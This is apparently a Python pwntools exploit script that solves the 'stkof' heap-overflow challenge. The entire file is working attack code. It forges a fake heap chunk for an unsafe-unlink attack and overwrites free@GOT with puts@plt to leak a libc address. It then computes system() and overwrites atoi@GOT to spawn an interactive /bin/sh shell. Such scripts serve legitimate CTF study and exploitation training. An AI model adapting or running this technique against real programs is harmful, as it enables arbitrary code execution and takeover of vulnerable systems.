from pwn import *
from LibcSearcher import LibcSearcher
io=process("./stkof")
elf=ELF("stkof")


def alloc(size):
    io.sendline("1")
    io.sendline(str(size))
    io.recvuntil("OK\n")
    

def edit(index,data):
    io.sendline("2")
    io.sendline(str(index))
    io.sendline(str(len(data)))
    io.send(data)
    io.recvuntil("OK\n")

def free(index):
    io.sendline("3")
    io.sendline(str(index))
    
info_addr=0x602140

alloc(0x100)
alloc(0x30)#chunk2
alloc(0x80)#chunk3,small chunk can merge
#gdb.attach(io,"b fgets")
#fake chunk
payload1=p64(0)
payload1+=p64(0x21)
payload1+=p64(info_addr+0x10-0x18)#fakefd
payload1+=p64(info_addr+0x10-0x10)#fakebk
payload1+=p64(0x20)#fake chunk size
payload1+=p64(0x61)#anything
#overflow chunk3
payload1+=p64(0x30)#cheat it that prev chunk is my fake chunk
payload1+=p64(0x90)#cheat it that prev chunk is free
edit(2,payload1)
free(3)

io.recvuntil("OK\n")

payload2='a'*16#overflow info[-1],info[0]
#print "free@got:"+hex(elf.got['free'])
payload2+=p64(elf.got['free'])#info[1]
payload2+=p64(elf.got['puts'])#info[2]
payload2+=p64(elf.got['atoi'])#info[3]
edit(2,payload2)

payload3=p64(elf.plt['puts'])
#print "puts@plt:"+hex(elf.plt['puts'])


edit(1,payload3)#change free@got to puts@plt

free(2)#means puts(puts_addr)
temp=io.recv()
print len(temp)#10
puts_addr=u64(temp[0:6]+'\x00\x00')#cut "\nOK\n"

print "puts_addr:"+hex(puts_addr)

#have libc
libc=ELF("./libc.so.6")
libc_base=puts_addr-libc.symbols['puts']
system_addr=libc_base+libc.symbols['system']
binsh_addr=libc_base+libc.search('/bin/sh').next()

#lack libc
'''
libc=LibcSearcher('puts',puts_addr)
libc_base=puts_addr-libc.dump('puts')
system_addr=libc_base+libc.dump('system')
binsh_addr=libc_base+libc.dump('str_bin_sh')
'''

payload4=p64(system_addr)
edit(3,payload4)
io.send("/bin/sh")
#io.sendline(p64(binsh_addr))
io.interactive()



